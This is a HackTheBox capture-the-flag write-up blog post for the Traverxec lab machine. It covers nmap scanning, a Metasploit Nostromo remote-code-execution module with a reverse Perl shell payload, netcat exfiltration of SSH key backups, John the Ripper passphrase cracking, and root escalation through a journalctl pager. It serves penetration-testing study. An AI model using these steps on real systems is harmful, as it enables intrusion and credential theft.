<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Traverxec Writeup – HackTheBox" /><meta name="author" content="00x71" /><meta property="og:locale" content="en" /><meta name="description" content="Hack The Box, Penetration Testing" /><meta property="og:description" content="Hack The Box, Penetration Testing" /><link rel="canonical" href="/posts/Traverxec-Writeup-HackTheBox/" /><meta property="og:url" content="/posts/Traverxec-Writeup-HackTheBox/" /><meta property="og:site_name" content="00x71 Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-01-12T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Traverxec Writeup – HackTheBox" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@00x71" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"00x71"},"dateModified":"2021-09-28T04:17:31+08:00","datePublished":"2020-01-12T00:00:00+08:00","description":"Hack The Box, Penetration Testing","headline":"Traverxec Writeup – HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/Traverxec-Writeup-HackTheBox/"},"url":"/posts/Traverxec-Writeup-HackTheBox/"}</script><title>Traverxec Writeup – HackTheBox | 00x71 Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="00x71 Blog"><meta name="application-name" content="00x71 Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://cdn.jsdelivr.net/gh/cotes2020/chirpy-images/commons/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">00x71 Blog</a></div><div class="site-subtitle font-italic">Abdulrahman, Cyber Security Professional</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/github_username" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Traverxec Writeup – HackTheBox</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Traverxec Writeup – HackTheBox</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> 00x71 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 12, 2020, 12:00 AM +0800" >Jan 12, 2020<i class="unloaded">2020-01-12T00:00:00+08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Sep 28, 2021, 12:17 AM +0400" >Sep 28, 2021<i class="unloaded">2021-09-28T04:17:31+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1346 words">7 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/00x71/00x71.github.io/master/_posts/images/Traverxec/Traverxec.png" style="display: block; margin: auto;" /></p><h1 id="scanning">Scanning</h1><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-sC</span> <span class="nt">-T4</span> <span class="nt">-v</span> 10.10.10.165
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-12-07 17:57 EST
Nmap scan report <span class="k">for </span>10.10.10.165
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c <span class="o">(</span>RSA<span class="o">)</span>
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.2 - 4.9 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.18 <span class="o">(</span>90%<span class="o">)</span>, Crestron XPanel control system <span class="o">(</span>90%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>89%<span class="o">)</span>, ASUS RT-N56U WAP <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>87%<span class="o">)</span>, Linux 3.1 <span class="o">(</span>87%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>87%<span class="o">)</span>, HP P2000 G3 NAS device <span class="o">(</span>87%<span class="o">)</span>, AXIS 210A or 211 Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>87%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
Uptime guess: 34.455 days <span class="o">(</span>since Sun Nov  3 07:03:30 2019<span class="o">)</span>
Network Distance: 2 hops
TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>263 <span class="o">(</span>Good luck!<span class="o">)</span>
IP ID Sequence Generation: All zeros
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span class="o">(</span>using port 80/tcp<span class="o">)</span>
HOP RTT       ADDRESS
1   116.76 ms 10.10.14.1
2   117.07 ms 10.10.10.165
</pre></table></code></div></div><p>It seems that we have a web server called “Nostromo”. For more information here: http://www.nazgul.ch/dev_nostromo.html.</p><p>After searching on the web, I found out a Metasploit exploitation module for the Nostromo 1.9.6. Try to run Metasploit and search on nostromo 1.9.6. You will find the module exploit/multi/http/nostromo_code_exec</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre>msf5 <span class="o">&gt;</span> search nostromo 1.9.6

Matching Modules
<span class="o">================</span>

   <span class="c">#  Name                                       Disclosure Date  Rank    Check  Description</span>
   -  <span class="nt">----</span>                                       <span class="nt">---------------</span>  <span class="nt">----</span>    <span class="nt">-----</span>  <span class="nt">-----------</span>
   0  exploit/multi/http/nostromo_code_exec      2019-10-20       good    Yes    Nostromo Directory Traversal Remote Command Ex

msf5 <span class="o">&gt;</span> use exploit/multi/http/nostromo_code_exec 

msf5 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> <span class="o">&gt;</span> show options 

Module options <span class="o">(</span>exploit/multi/http/nostromo_code_exec<span class="o">)</span>:

   Name     Current Setting  Required  Description
   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   Proxies                   no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
   RHOSTS                    <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
   RPORT    80               <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
   SRVHOST  0.0.0.0          <span class="nb">yes       </span>The <span class="nb">local </span>host to listen on. This must be an address on the <span class="nb">local </span>machine or 0.0.0.0
   SRVPORT  8080             <span class="nb">yes       </span>The <span class="nb">local </span>port to listen on.
   SSL      <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
   SSLCert                   no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
   URIPATH                   no        The URI to use <span class="k">for </span>this exploit <span class="o">(</span>default is random<span class="o">)</span>
   VHOST                     no        HTTP server virtual host


Payload options <span class="o">(</span>cmd/unix/reverse_perl<span class="o">)</span>:

   Name   Current Setting  Required  Description
   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   LHOST                   <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
   LPORT  4444             <span class="nb">yes       </span>The listen port


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic <span class="o">(</span>Unix In-Memory<span class="o">)</span>
</pre></table></code></div></div><p>Set the module options (remote host, local host) then run the exploit.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/00x71/00x71.github.io/master/_posts/images/Traverxec/1.png" style="display: block; margin: auto;" /></p><p>After while, we find the user “david” under the (/home) directory, but its appear that we need a special permission to list the content of that directory.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/00x71/00x71.github.io/master/_posts/images/Traverxec/2.png" style="display: block; margin: auto;" /></p><p>If we look at the configuration server path (/var/nostromo/conf), we could find a file called “nhttpd.conf”, and from it’s name we can guess that is the web server configuration file.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>www-data@traverxec:/var/nostromo/conf<span class="nv">$ </span><span class="nb">cat </span>nhttpd.conf
<span class="nb">cat </span>nhttpd.conf
<span class="c"># MAIN [MANDATORY]</span>
servername     traverxec.htb
serverlisten      <span class="k">*</span>
serveradmin    david@traverxec.htb
serverroot     /var/nostromo
servermimes    conf/mimes
docroot        /var/nostromo/htdocs
docindex    index.html
<span class="c"># LOGS [OPTIONAL]</span>
logpid         logs/nhttpd.pid
 
<span class="c"># SETUID [RECOMMENDED]</span>
user        www-data
<span class="c"># BASIC AUTHENTICATION [OPTIONAL]</span>
htaccess    .htaccess
htpasswd    /var/nostromo/conf/.htpasswd
<span class="c"># ALIASES [OPTIONAL]</span>
/icons         /var/nostromo/icons
<span class="c"># HOMEDIRS [OPTIONAL]</span>
homedirs    /home
homedirs_public      public_www
</pre></table></code></div></div><p>After some inspection, we can tell that there is two types of home directories, and one of them which is “public_www” refer to “Public Directory”. lets try and list the content of the “public_www” directory under David home directory (/home/david/public_www).</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>www-data@traverxec:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-alh</span> /home/david/public_www
<span class="nb">ls</span> <span class="nt">-alh</span> /home/david/public_www
total 16K
drwxr-xr-x 3 david david 4.0K Oct 25 15:45 <span class="nb">.</span>
drwx--x--x 5 david david 4.0K Oct 25 17:02 ..
<span class="nt">-rw-r--r--</span> 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4.0K Oct 25 17:02 protected-file-area
</pre></table></code></div></div><p>There is an interesting directory called “protected-file-area”, lets see what we have there.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>www-data@traverxec:/<span class="nv">$ </span><span class="nb">ls</span> /home/david/public_www/protected-file-area
<span class="nb">ls</span> /home/david/public_www/protected-file-area
backup-ssh-identity-files.tgz
</pre></table></code></div></div><p>We found a compressed file called “backup-ssh-identity-files.tgz”, which is definitely a file that we want gets our hands on it. We need to send the file to our machine since we can not uncompressing the file inside the box.</p><p>We will send it via Netcat. In the box use the command:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>nc &lt;Your IP&gt; &lt;port&gt; &lt; backup-ssh-identity-files.tgz //in the Box
nc <span class="nt">-l</span> <span class="nt">-p</span> &lt;port&gt; <span class="o">&gt;</span> backup-ssh-identity-files.tgz //in your machine

</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/00x71/00x71.github.io/master/_posts/images/Traverxec/3.png" style="display: block; margin: auto;" /></p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/HackTheBox/Traverxec# <span class="nb">tar </span>xvzf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
</pre></table></code></div></div><p>After decompress the file, We will find private and public ssh keys. Try access the machine via SSH using David user account and the aforementioned SSH private key.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/HackTheBox/Traverxec# ssh <span class="nt">-i</span> id_rsa david@10.10.10.165
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
</pre></table></code></div></div><p>A passphrase is needed to access the machine. We will try to crack it by JohnTheRipper tool. First of all, we need to convert the ssh key to a hash that the JTR tool can crack. We will use “ssh2john” script for that. To find the script’s path, run the command “locate ssh2john”.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/share/john/ssh2john.py &lt;Private_Key&gt; <span class="o">&gt;</span> Hash_File
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/00x71/00x71.github.io/master/_posts/images/Traverxec/4.png" style="display: block; margin: auto;" /></p><p>Now we will use JohnTheRipper tool to crack the converted hash.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/HackTheBox/Traverxec# john hash.txt 
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
finding a possible candidate.
Proceeding with single, rules:Single
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Warning: Only 1 candidate buffered <span class="k">for </span>the current salt, minimum 8 needed <span class="k">for </span>performance.
Almost <span class="k">done</span>: Processing the remaining buffered candidate passwords, <span class="k">if </span>any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
hunter           <span class="o">(</span>id_rsa<span class="o">)</span>
Proceeding with incremental:ASCII
1g 0:00:00:05  3/3 0.1869g/s 2016Kp/s 2016Kc/s 2016KC/s mimpsox
Session aborted
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/00x71/00x71.github.io/master/_posts/images/Traverxec/5.png" style="display: block; margin: auto;" /></p><h1 id="root">Root</h1><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>david@traverxec:~<span class="nv">$ </span><span class="nb">pwd</span>
/home/david
david@traverxec:~<span class="nv">$ </span><span class="nb">ls
</span>bin  public_www  user.txt
david@traverxec:~<span class="nv">$ </span><span class="nb">cd </span>bin/
david@traverxec:~/bin<span class="nv">$ </span><span class="nb">ls
</span>server-stats.head  server-stats.sh
</pre></table></code></div></div><p>Now we are in the David’s home directory. We found (/Bin) directory which have a bash script. Lets look into it.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
 
<span class="nb">cat</span> /home/david/bin/server-stats.head
<span class="nb">echo</span> <span class="s2">"Load: </span><span class="sb">`</span>/usr/bin/uptime<span class="sb">`</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">" "</span>
<span class="nb">echo</span> <span class="s2">"Open nhttpd sockets: </span><span class="sb">`</span>/usr/bin/ss <span class="nt">-H</span> sport <span class="o">=</span> 80 | /usr/bin/wc <span class="nt">-l</span><span class="sb">`</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">"Files in the docroot: </span><span class="sb">`</span>/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc <span class="nt">-l</span><span class="sb">`</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">" "</span>
<span class="nb">echo</span> <span class="s2">"Last 5 journal log lines:"</span>
/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service | /usr/bin/cat 
</pre></table></code></div></div><p>This script is to check the status of the nostromo server. From the last line, we can tell that the script will print the last 5 line of the nostromo status log. For more about journalctl: https://www.linode.com/docs/quick-answers/linux/how-to-use-journalctl/</p><p>When we execute the last line of the script:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service | /usr/bin/cat 
</pre></table></code></div></div><p>It will display the last 5 line of the log normally. But if we execute it without the “cat” after the pipeline:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/00x71/00x71.github.io/master/_posts/images/Traverxec/6.png" style="display: block; margin: auto;" /></p><p>The log will be displayed in Vim terminal that will be run with root permission, which we can take advantage of it by escalating the privilege to root. Looking into GTFOBins page https://gtfobins.github.io/gtfobins/systemctl/, we found an interesting way to escalate privileges to root.</p><p>Simply, execute “!/bin/bash” at the bottom of the terminal, as it will be executed as root to get root bash terminal.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/00x71/00x71.github.io/master/_posts/images/Traverxec/7.png" style="display: block; margin: auto;" /></p><p>And we got root!</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/00x71/00x71.github.io/master/_posts/images/Traverxec/8.png" style="display: block; margin: auto;" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >HackTheBox</a> <a href="/tags/penetration-testing/" class="post-tag no-text-decoration" >Penetration Testing</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Traverxec Writeup – HackTheBox - 00x71 Blog&url=/posts/Traverxec-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Traverxec Writeup – HackTheBox - 00x71 Blog&u=/posts/Traverxec-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Traverxec Writeup – HackTheBox - 00x71 Blog&url=/posts/Traverxec-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PEN300-(OSEP)-Notes/">Offensive-Security PEN-300 Notes</a><li><a href="/posts/OpenAdmin-Writeup-HackTheBox/">OpenAdmin Writeup – HackTheBox</a><li><a href="/posts/Traverxec-Writeup-HackTheBox/">Traverxec Writeup – HackTheBox</a><li><a href="/posts/CRTO-Course-Notes/">CRTO Notes</a><li><a href="/posts/enable-google-pv/">Enable Google Page Views</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/penetration-testing/">Penetration Testing</a> <a class="post-tag" href="/tags/c-crto-redteaming/">C# CRTO REDTEAMING</a> <a class="post-tag" href="/tags/google-analytics/">google analytics</a> <a class="post-tag" href="/tags/offensive-security/">Offensive-Security</a> <a class="post-tag" href="/tags/osep/">OSEP</a> <a class="post-tag" href="/tags/pageviews/">pageviews</a> <a class="post-tag" href="/tags/red-team/">Red_Team</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/OpenAdmin-Writeup-HackTheBox/"><div class="card-body"> <span class="timeago small" >Mar 2, 2020<i class="unloaded">2020-03-02T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OpenAdmin Writeup – HackTheBox</h3><div class="text-muted small"><p> Scanning 1 2 3 4 5 6 7 8 9 10 11 12 13 